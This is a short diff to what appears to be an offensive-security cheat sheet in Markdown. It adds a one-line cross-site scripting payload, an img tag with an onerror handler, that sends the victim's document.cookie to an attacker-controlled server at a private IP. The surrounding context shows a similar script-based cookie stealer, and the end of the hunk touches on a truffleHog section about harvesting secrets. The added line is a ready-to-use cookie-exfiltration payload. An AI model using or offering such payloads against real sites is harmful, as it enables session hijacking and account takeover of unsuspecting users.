@@ -622,6 +622,12 @@ The following script sends the request to an attacker terminal:
  cookie="+btoa(document.cookie);</script>
  ```
 
+One liner:
+```javascript
+<img src=x onerror=\"new Image().src='http://10.10.15.186:8000/log.php?cookie='+encodeURIComponent(document.cookie)\">
+```
+
+
 # Aggregating Sensitive Information
 ## truffleHog
 This tool gets high entropy strings (e.g. Password, APIKey, etc...).
